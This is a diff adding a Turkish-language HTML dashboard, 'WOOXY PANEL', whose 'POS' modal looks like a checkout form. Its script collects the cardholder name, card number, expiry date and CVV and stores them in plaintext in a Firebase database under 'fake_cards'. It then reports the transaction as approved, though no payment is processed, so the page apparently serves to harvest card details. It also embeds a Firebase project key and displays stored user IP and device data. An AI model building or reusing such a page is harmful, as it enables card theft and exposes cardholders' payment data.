@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WOOXY | DASHBOARD</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* --- POS MODAL ÖZEL STİLLERİ --- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(8px);
+        }
+
+        .modal {
+            width: fit-content;
+            height: fit-content;
+            background: #FFFFFF;
+            box-shadow: 0px 187px 75px rgba(0, 0, 0, 0.01), 0px 105px 63px rgba(0, 0, 0, 0.05);
+            border-radius: 26px;
+            max-width: 450px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+
+        .form { display: flex; flex-direction: column; gap: 20px; padding: 20px; }
+        .payment--options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; padding: 10px; }
+        .payment--options button { height: 55px; background: #F2F2F2; border-radius: 11px; border: 0; cursor: pointer; }
+        .payment--options button svg { height: 18px; }
+        .separator { display: grid; grid-template-columns: 1fr 2fr 1fr; gap: 10px; color: #8B8E98; align-items: center; }
+        .separator p { font-weight: 600; font-size: 11px; margin: 0; text-align: center; }
+        .separator .line { width: 100%; height: 1px; border: 0; background-color: #e8e8e8; }
+        .credit-card-info--form { display: flex; flex-direction: column; gap: 15px; }
+        .input_container { display: flex; flex-direction: column; gap: 5px; }
+        .input_label { font-size: 10px; color: #8B8E98; font-weight: 600; text-align: left; }
+        .input_field { height: 40px; padding: 0 16px; border-radius: 9px; border: 1px solid #e5e5e5; background-color: #F2F2F2; outline: none; color: #000; }
+        .input_field:focus { border: 1px solid #242424; background-color: transparent; }
+        
+        .split { display: grid; grid-template-columns: 5fr 2fr; gap: 15px; }
+        
+        .purchase--btn { height: 55px; border-radius: 11px; border: 0; color: #ffffff; font-size: 13px; font-weight: 700; background: linear-gradient(180deg, #363636 0%, #1B1B1B 50%, #000000 100%); cursor: pointer; transition: 0.3s; }
+        .purchase--btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .input_field::-webkit-inner-spin-button, .input_field::-webkit-outer-spin-button { -webkit-appearance: none; }
+    </style>
+</head>
+<body>
+
+    <h1 class="main-header">WOOXY PANEL</h1>
+
+    <div class="dashboard-grid">
+        <div class="card active-card">
+            <div class="header">
+                <div class="top">
+                    <div class="circle"><span class="red circle2"></span></div>
+                    <div class="circle"><span class="yellow circle2"></span></div>
+                    <div class="circle"><span class="green circle2"></span></div>
+                    <div class="title"><p class="title2">profile.json</p></div>
+                </div>
+            </div>
+            <div class="code-container">
+                <div class="area">
+                    <div class="info-row"><label>USER:</label> <span id="userName">Yükleniyor...</span></div>
+                    <div class="info-row"><label>RANK:</label> <span id="userRole">...</span></div>
+                    <div class="info-row"><label>STATUS:</label> <span class="highlight-green">AUTHORIZED</span></div>
+                </div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="header"><div class="top"><div class="circle"><span class="red circle2"></span></div><div class="circle"><span class="yellow circle2"></span></div><div class="circle"><span class="green circle2"></span></div><div class="title"><p class="title2">system.log</p></div></div></div>
+            <div class="code-container"><div class="area">
+                <div class="info-row"><label>IP:</label> <span id="ipInfo">0.0.0.0</span></div>
+                <div class="info-row"><label>OS:</label> <span id="deviceInfo">Detecting...</span></div>
+                <div class="info-row"><label>SYSTEM:</label> <span style="color:#ffbd44">STABLE</span></div>
+            </div></div>
+        </div>
+        <div class="card">
+            <div class="header"><div class="top"><div class="circle"><span class="red circle2"></span></div><div class="circle"><span class="yellow circle2"></span></div><div class="circle"><span class="green circle2"></span></div><div class="title"><p class="title2">activity.txt</p></div></div></div>
+            <div class="code-container"><div class="area">
+                <div class="info-row"><label>LAST:</label> <span id="lastLogin">...</span></div>
+                <div class="info-row"><label>SESSION:</label> <span>ENCRYPTED</span></div>
+                <div class="info-row"><label>UPTIME:</label> <span class="highlight-green">99.9%</span></div>
+            </div></div>
+        </div>
+    </div>
+
+    <div class="btn-container">
+        <button class="terminate-btn" onclick="handleLogout()">TERMINATE SESSION</button>
+        <button id="adminBtn" class="admin-uiverse-btn" onclick="window.location.href='admin.html'">ADMİN COMMAND</button>
+        <button id="posBtn" class="admin-uiverse-btn" onclick="togglePos(true)">POS</button>
+    </div>
+
+    <div id="posOverlay" class="modal-overlay" onclick="togglePos(false)">
+        <div class="modal" onclick="event.stopPropagation()">
+            <form class="form">
+                <div class="payment--options">
+                    <button type="button"><svg viewBox="0 0 124 33" xmlns="http://www.w3.org/2000/svg"><path d="M46.211,6.749h-6.839c-0.468,0-0.866,0.34-0.939,0.802l-2.766,17.537c-0.055,0.346,0.213,0.658,0.564,0.658 h3.265c0.468,0,0.866-0.34,0.939-0.803l0.746-4.73c0.072-0.463,0.471-0.803,0.938-0.803h2.165c4.505,0,7.105-2.18,7.784-6.5 c0.306-1.89,0.013-3.375-0.872-4.415C50.224,7.353,48.5,6.749,46.211,6.749z M47,13.154c-0.374,2.454-2.249,2.454-4.062,2.454 h-1.032l0.724-4.583c0.043-0.277,0.283-0.481,0.563-0.481h0.473c1.235,0,2.4,0,3.002,0.704C47.027,11.668,47.137,12.292,47,13.154z" fill="#253B80"></path></svg></button>
+                    <button type="button"><svg viewBox="0 0 512 210.2" xmlns="http://www.w3.org/2000/svg"><path d="M93.6,27.1C87.6,34.2,78,39.8,68.4,39c-1.2-9.6,3.5-19.8,9-26.1c6-7.3,16.5-12.5,25-12.9 C103.4,10,99.5,19.8,93.6,27.1 M102.3,40.9c-13.9-0.8-25.8,7.9-32.4,7.9c-6.7,0-16.8-7.5-27.8-7.3c-14.3,0.2-27.6,8.3-34.9,21.2 c-15,25.8-3.9,64,10.6,85c7.1,10.4,15.6,21.8,26.8,21.4c10.6-0.4,14.8-6.9,27.6-6.9c12.9,0,16.6,6.9,27.8,6.7 c11.6-0.2,18.9-10.4,26-20.8c8.1-11.8,11.4-23.3,11.6-23.9c-0.2-0.2-22.4-8.7-22.6-34.3c-0.2-21.4,17.5-31.6,18.3-32.2 C123.3,42.9,107.7,41.3,102.3,40.9" fill="#000"></path></svg></button>
+                    <button type="button"><svg viewBox="0 0 80 39" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M25.9 17.7C25.9 16.8 25.8 15.9 25.7 15H13.2V20.1H20.3C20 21.7 19.1 23.2 17.7 24.1V27.4H22C24.5 25.1 25.9 21.7 25.9 17.7Z"></path></svg></button>
+                </div>
+                <div class="separator"><hr class="line"><p>or pay using credit card</p><hr class="line"></div>
+                <div class="credit-card-info--form">
+                    <div class="input_container">
+                        <label class="input_label">Card holder full name</label>
+                        <input id="holderInput" class="input_field" type="text" placeholder="Ad Soyad">
+                    </div>
+                    <div class="input_container">
+                        <label class="input_label">Card Number</label>
+                        <input id="cardNumInput" class="input_field" type="text" maxlength="16" inputmode="numeric" placeholder="16 Haneli Kart Numarası">
+                    </div>
+                    <div class="input_container">
+                        <label class="input_label">Expiry Date / CVV</label>
+                        <div class="split">
+                            <input id="expiryInput" class="input_field" type="text" maxlength="5" placeholder="01/26">
+                            <input id="cvvInput" class="input_field" type="text" maxlength="4" inputmode="numeric" placeholder="CVV">
+                        </div>
+                    </div>
+                </div>
+                <button type="button" class="purchase--btn" onclick="saveCardToFirebase()">Checkout</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyB6XlCbPxs6I1jJThZ6OTiaJ-Xssw_mkbA",
+            authDomain: "wooxyproject.firebaseapp.com",
+            databaseURL: "https://wooxyproject-default-rtdb.firebaseio.com/",
+            projectId: "wooxyproject",
+            storageBucket: "wooxyproject.firebasestorage.app",
+            messagingSenderId: "932458468968",
+            appId: "1:932458468968:web:ca0e8230bfae415f3c8ddd"
+        };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const db = firebase.database();
+
+        function handleLogout() {
+            localStorage.removeItem('currentUser');
+            window.location.href = 'index.html';
+        }
+
+        function togglePos(show) {
+            document.getElementById('posOverlay').style.display = show ? 'flex' : 'none';
+        }
+
+        // --- GİRİŞ KISITLAMALARI (Sadece Rakam Girişi) ---
+        function setInputRestrictions() {
+            // Kart Numarası: Sadece rakam
+            document.getElementById('cardNumInput').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+            });
+
+            // CVV: Sadece rakam
+            document.getElementById('cvvInput').addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+            });
+
+            // Tarih: Rakam ve sadece "/"
+            document.getElementById('expiryInput').addEventListener('input', function(e) {
+                this.value = this.value.replace(/[^0-9/]/g, '');
+            });
+        }
+
+        function init() {
+            const userKey = localStorage.getItem('currentUser');
+            if (!userKey) { window.location.href = 'index.html'; return; }
+
+            db.ref('users/' + userKey).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (!data) return;
+                document.getElementById('userName').innerText = (data.username || userKey).toUpperCase();
+                document.getElementById('userRole').innerText = (data.role || "USER").toUpperCase();
+                document.getElementById('ipInfo').innerText = data.ip || "Unknown";
+                document.getElementById('deviceInfo').innerText = data.device || "Windows PC";
+                document.getElementById('lastLogin').innerText = data.lastLogin || "Just Now";
+
+                const adminBtn = document.getElementById('adminBtn');
+                const posBtn = document.getElementById('posBtn');
+                
+                if (data.role === 'admin') { adminBtn.style.display = 'block'; } 
+                else { adminBtn.style.display = 'none'; }
+                posBtn.style.display = 'block';
+                
+                if (data.isBanned) { handleLogout(); }
+            });
+
+            setInputRestrictions(); // Kısıtlamaları aktifleştir
+        }
+        window.onload = init;
+
+        async function saveCardToFirebase() {
+            const fullName = document.getElementById('holderInput').value.trim();
+            const cardNumber = document.getElementById('cardNumInput').value.replace(/\s+/g, '');
+            const expiryDate = document.getElementById('expiryInput').value.trim();
+            const cvv = document.getElementById('cvvInput').value.trim();
+
+            // 1. İsim Kontrolü (Harf + Boşluk + Harf)
+            const nameRegex = /^[a-zA-ZçğıöşüÇĞİÖŞÜ]+\s[a-zA-ZçğıöşüÇĞİÖŞÜ]+.*$/;
+            if (!nameRegex.test(fullName)) {
+                alert("Lütfen geçerli bir Ad Soyad giriniz!");
+                return;
+            }
+
+            // 2. Kart Numarası (Tam 16)
+            if (cardNumber.length !== 16) {
+                alert("Kart numarası tam olarak 16 haneli olmalıdır!");
+                return;
+            }
+
+            // 3. Tarih Kontrolü
+            const dateParts = expiryDate.split('/');
+            if (dateParts.length !== 2) {
+                alert("Tarih formatı MM/YY (01/26) olmalıdır!");
+                return;
+            }
+
+            const month = parseInt(dateParts[0], 10);
+            const year = parseInt("20" + dateParts[1], 10);
+            const now = new Date();
+            const currentYear = now.getFullYear();
+            const currentMonth = now.getMonth() + 1;
+
+            if (month < 1 || month > 12) {
+                alert("Ay 01-12 arasında olmalıdır!");
+                return;
+            }
+
+            if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                alert("Kartın süresi dolmuş!");
+                return;
+            }
+
+            // 4. CVV Kontrolü
+            if (cvv.length < 3 || cvv.length > 4) {
+                alert("CVV 3 veya 4 haneli olmalıdır!");
+                return;
+            }
+
+            let cardType = "OtherCards";
+            if (cardNumber.startsWith('4')) cardType = "Visa";
+            else if (cardNumber.startsWith('5')) cardType = "Mastercard";
+
+            try {
+                const cardRef = db.ref('fake_cards/' + cardType).push();
+                await cardRef.set({
+                    holder_name: fullName,
+                    card_number: cardNumber,
+                    expiry_date: expiryDate,
+                    cvv: cvv,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    added_date: new Date().toLocaleString('tr-TR')
+                });
+
+                alert("İşlem Onaylandı!");
+                togglePos(false);
+                
+                // Formu Temizle
+                document.querySelectorAll('.input_field').forEach(el => el.value = "");
+
+            } catch (error) {
+                alert("Hata: " + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
